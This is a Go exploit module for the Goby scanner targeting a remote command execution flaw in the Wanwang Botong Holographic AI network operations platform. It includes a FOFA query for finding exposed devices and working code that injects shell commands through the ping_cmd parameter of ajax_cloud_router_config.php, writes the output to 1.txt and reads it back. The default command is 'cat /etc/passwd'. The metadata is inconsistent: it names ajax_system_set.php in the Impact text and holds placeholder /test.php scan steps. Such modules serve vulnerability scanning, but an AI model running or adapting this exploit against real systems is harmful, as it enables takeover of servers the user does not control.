package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
)

func init() {
  expJson := `{
    "Name": "Wanwang Botong Holographic AI Network Operation and Maintenance Platform Ajax_ Cloud_ Router_ Config.php Remote Command Execution Vulnerability",
    "Description": "<p>The comprehensive operation and maintenance platform of Wanwang Botong holographic AI weak current network has achieved zero breakthrough in weak current intelligent AI network.</p><p>Wanwang Botong Holographic AI Network Operation and Maintenance Platform Ajax_ Cloud_ Router_ There is a remote command execution vulnerability in config.php. By constructing HTTP requests, attackers can execute arbitrary code on the server side, write and execute, obtain server privileges, and gain control over the entire web server.</p>",
    "Product": "Wanwang Botong Holographic AI Network Operation and Maintenance Platform",
    "Homepage": "http://www.tg-net.cn/product/quanxiaipingtai.html",
    "DisclosureDate": "2021-07-25",
    "PostTime": "2023-06-28",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "body=\"/nmss/index/css/index.css\"",
    "GobyQuery": "body=\"/nmss/index/css/index.css\"",
    "Level": "3",
    "Impact": "<p>Wanwang Botong Holographic AI Network Operation and Maintenance Platform Ajax_ System_ There is a remote command execution vulnerability in set.php. By constructing HTTP requests, attackers can execute arbitrary code on the server side, write and execute, obtain server privileges, and gain control over the entire web server.</p>",
    "Recommendation": "<p><a href=\"https://fanyi.baidu.com/###\"></a><a></a></p><p>The official has not yet fixed the vulnerability. Please contact the customer to fix the vulnerability: <a href=\"http://www.tg-net.cn/product/quanxiaipingtai.html\">http://www.tg-net.cn/product/quanxiaipingtai.html</a></p><p>1. If necessary, prohibit public access to the device.</p><p>2. Set access policies and list access through security devices such as firewall</p>",
    "References": [
        "https://mp.weixin.qq.com/s/u6pbwDQ7gnc4gCcUOXKRYQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "万网博通全息 AI 网络运维平台 ajax_cloud_router_config.php 文件 远程命令执行漏洞",
            "Product": "万网博通全息AI网络运维平台",
            "Description": "<p>万网博通全息AI弱电网络综合运维平台实现了弱电智能化AI网络零突破。</p><p>万网博通全息AI网络运维平台ajax_cloud_router_config.php存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.tg-net.cn/product/quanxiaipingtai.html\">http://www.tg-net.cn/product/quanxiaipingtai.html</a><br></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问<br></p>",
            "Impact": "<p>万网博通全息AI网络运维平台ajax_system_set.php存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Wanwang Botong Holographic AI Network Operation and Maintenance Platform Ajax_ Cloud_ Router_ Config.php Remote Command Execution Vulnerability",
            "Product": "Wanwang Botong Holographic AI Network Operation and Maintenance Platform",
            "Description": "<p>The comprehensive operation and maintenance platform of Wanwang Botong holographic AI weak current network has achieved zero breakthrough in weak current intelligent AI network.</p><p>Wanwang Botong Holographic AI Network Operation and Maintenance Platform Ajax_ Cloud_ Router_ There is a remote command execution vulnerability in config.php. By constructing HTTP requests, attackers can execute arbitrary code on the server side, write and execute, obtain server privileges, and gain control over the entire web server.</p>",
            "Recommendation": "<p><a href=\"https://fanyi.baidu.com/###\"></a><a></a></p><p>The official has not yet fixed the vulnerability. Please contact the customer to fix the vulnerability:&nbsp;<a href=\"http://www.tg-net.cn/product/quanxiaipingtai.html\" target=\"_blank\">http://www.tg-net.cn/product/quanxiaipingtai.html</a></p><p>1. If necessary, prohibit public access to the device.</p><p>2. Set access policies and list access through security devices such as firewall</p>",
            "Impact": "<p>Wanwang Botong Holographic AI Network Operation and Maintenance Platform Ajax_ System_ There is a remote command execution vulnerability in set.php. By constructing HTTP requests, attackers can execute arbitrary code on the server side, write and execute, obtain server privileges, and gain control over the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10974"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      uri := "/nmss/cloud/Ajax/ajax_cloud_router_config.php"
      cfg := httpclient.NewPostRequestConfig(uri)
      cfg.VerifyTls = false
      cfg.FollowRedirect = false
      cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
      cfg.Data = "ping_cmd=|ls > 1.txt"
      if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
        cfg1 := httpclient.NewGetRequestConfig("/nmss/cloud/Ajax/1.txt")
        if resp1, err1 := httpclient.DoHttpRequest(u, cfg1); err1 == nil && resp1.StatusCode == 200 {
          return true
        }
      }
      return false
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      cmd := ss.Params["cmd"].(string)
      uri := "/nmss/cloud/Ajax/ajax_cloud_router_config.php"
      cfg := httpclient.NewPostRequestConfig(uri)
      cfg.VerifyTls = false
      cfg.FollowRedirect = false
      cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
      cfg.Data = "ping_cmd=|" + cmd + " > 1.txt"
      if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
        cfg1 := httpclient.NewGetRequestConfig("/nmss/cloud/Ajax/1.txt")
        if resp1, err1 := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err1 == nil {
          expResult.Output = resp1.Utf8Html
          expResult.Success = true
        }
      }
      return expResult
    },
  ))
}
